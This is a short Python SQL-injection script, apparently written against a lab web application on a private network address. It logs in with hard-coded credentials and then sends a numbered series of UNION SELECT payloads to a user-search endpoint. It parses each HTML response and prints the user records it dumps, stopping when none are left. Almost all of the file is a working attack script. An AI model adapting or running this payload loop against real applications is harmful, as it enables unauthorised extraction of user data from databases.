# -*- coding: utf-8 -*-
#SQL Injection: User Enumeration

import requests

def login():
	URL="http://192.168.0.7:9090/login"
	COOKIES = setSessionCookie(URL)
	post_data={'username':'gorkem','password':'gorkem'}
	post_request=requests.post(URL,data=post_data,cookies=COOKIES)
	URL="http://192.168.0.7:9090/app/usersearch"
	postString(URL,COOKIES)

def setSessionCookie(URL):
	pre_req = requests.get(URL)
	return pre_req.cookies

def postString(URL,COOKIES):
	ERR_STR="User not found"
	#STRING = "<h2>Search Result</h2>"
	userID=1
	while True:
			payload="' UNION SELECT * from Users WHERE ID=" + str(userID) + " --"
			DATA={"login":payload}
			post_request=requests.post(URL,cookies=COOKIES,data=DATA)
			print(post_request.status_code)
			print("Trying : " + payload)
			print(parseText(post_request.text))
			userID += 1
			if ERR_STR in post_request.text:
				print(ERR_STR)
				break


def parseText(FULL_TEXT):
	HINT_STR="<h2>Search Result</h2>"
	END_STR="</table>"
	TEXT = FULL_TEXT.split("\n")
	#for txt in TEXT:
	temp=""
	IsOutput=False
	for satir in TEXT:
		if HINT_STR in satir:
			IsOutput=True
		if END_STR in satir:
			IsOutput=False
			break
		if IsOutput:
			temp+=satir
	temp = clean(temp)
	return temp


def clean(TEXT):
	TEXT = TEXT.replace("<table class='table'>","")
	TEXT = TEXT.replace("<h2>Search Result</h2>","")
	TEXT = TEXT.replace("</tr>","")
	TEXT = TEXT.replace("<tr>","")
	TEXT = TEXT.replace("<th>","")
	TEXT = TEXT.replace("</th>","")
	TEXT = TEXT.replace("</td> ","")
	TEXT = TEXT.replace("<td>","")
	TEXT = TEXT.replace("ID","Login")
	return TEXT

	

if __name__ == '__main__':
	login()	
